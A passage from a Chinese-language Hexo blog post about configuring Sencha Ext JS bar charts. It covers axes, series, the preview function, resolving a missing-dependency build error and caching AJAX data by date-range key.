<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">axes: [&#123;</span><br><span class="line">	type: &#39;numeric&#39;,</span><br><span class="line">	position: &#39;left&#39;,</span><br><span class="line">	minimum: 0,</span><br><span class="line">	titleMargin: 20,</span><br><span class="line">	title: &#123;</span><br><span class="line">		text: &#39;人次&#39;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x2F;&#x2F; listeners: &#123;</span><br><span class="line">	&#x2F;&#x2F; 	rangechange: &#39;onAxisRangeChange&#39;</span><br><span class="line">	&#x2F;&#x2F; &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">	type: &#39;category&#39;,</span><br><span class="line">	position: &#39;bottom&#39;, &#x2F;&#x2F;显示在底部</span><br><span class="line">	title:&#39;日期&#39;</span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure>

<h3 id="series，设置数据源"><a href="#series，设置数据源" class="headerlink" title="series，设置数据源"></a>series，设置数据源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">series: &#123;</span><br><span class="line">	type: &#39;bar&#39;,</span><br><span class="line">	xField: &#39;date&#39;,</span><br><span class="line">	yField: &#39;price&#39;,</span><br><span class="line">	&#x2F;&#x2F; style: &#123;</span><br><span class="line">	&#x2F;&#x2F; 	minGapWidth: 20  &#x2F;&#x2F;每个柱状图的间隔</span><br><span class="line">	&#x2F;&#x2F; &#125;,</span><br><span class="line">	highlight: &#123;&#x2F;&#x2F;每个轴的高亮</span><br><span class="line">		strokeStyle: &#39;black&#39;,  &#x2F;&#x2F;选择时的边框颜色</span><br><span class="line">		fillStyle: &#39;gold&#39;  &#x2F;&#x2F;选择时的高亮</span><br><span class="line">	&#125;,</span><br><span class="line">	label: &#123;</span><br><span class="line">		field: &#39;price&#39;,</span><br><span class="line">		display: &#39;insideEnd&#39;,</span><br><span class="line">		&#x2F;&#x2F; renderer: &#39;onSeriesLabelRender&#39;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h3 id="图表自带预览功能"><a href="#图表自带预览功能" class="headerlink" title="图表自带预览功能"></a>图表自带预览功能</h3><p>这个功能自Ext.draw.Container继承而来，具体的实现比较荣长，可以在控制台输出，就能跳到对应的代码位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	text:&quot;预览&quot;,</span><br><span class="line">	handler:function()&#123;</span><br><span class="line">		var chart &#x3D; me.down(&#39;cartesian&#39;);</span><br><span class="line">		chart.preview();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>sencha app build testing模式下打包，能显示具体的报错信息。如下，提示，某个依赖的组件未认出。</p>
<p><img src="img/1562235669387.png" alt="1562235669387"></p>
<p><strong>解决方法：</strong></p>
<blockquote>
<p>添加依赖，如下。大概就这么多。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requires:[</span><br><span class="line">		&#39;Ext.chart.axis.Numeric&#39;,</span><br><span class="line">		&#39;Ext.chart.axis.Category&#39;,</span><br><span class="line">		&#39;Ext.chart.series.Bar&#39;,</span><br><span class="line">		&#39;Ext.chart.interactions.ItemHighlight&#39;,</span><br><span class="line">	],</span><br></pre></td></tr></table></figure>

<p>之前一直以为是项目的配置有问题，但是添加了依赖了啊。</p>
<p><img src="img/1562236182844.png" alt="1562236182844"></p>
<h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>由于每次都要频繁的从后台加载数据，所以略做了优化，将请求的参数作为缓存的键值，对数据进行缓存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">me.cacheData&#x3D;&#123;&#125;  &#x2F;&#x2F;在组件init的时候，进行初始化。   而不是直接在属性上初始化，避免多个公用一个。</span><br><span class="line"></span><br><span class="line">var cacheKey&#x3D;query[&#39;start_date&#39;]+&#39;#&#39;+query[&#39;stop_date&#39;];</span><br><span class="line">&#x2F;&#x2F;尝试读取缓存，如果存在，直接读缓存，并处理</span><br><span class="line">if(me.cacheData[cacheKey])&#123;</span><br><span class="line">	me.analysisData(me.cacheData[cacheKey]);</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果不存在，则发送ajax请求</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/blog/page/32/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/blog/">1</a><span class="space">&hellip;</span><a class="page-number" href="/blog/page/32/">32</a><span class="page-number current">33</span><a class="page-number" href="/blog/page/34/">34</a><span class="space">&hellip;</span><a class="page-number" href="/blog/page/36/">36</a><a class="extend next" rel="next" href="/blog/page/34/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>


<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chaofml</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/blog/js/utils.js"></script><script src="/blog/js/motion.js"></script><script src="/blog/js/schemes/muse.js"></script><script src="/blog/js/next-boot.js"></script>

  







  






</body>
</html>
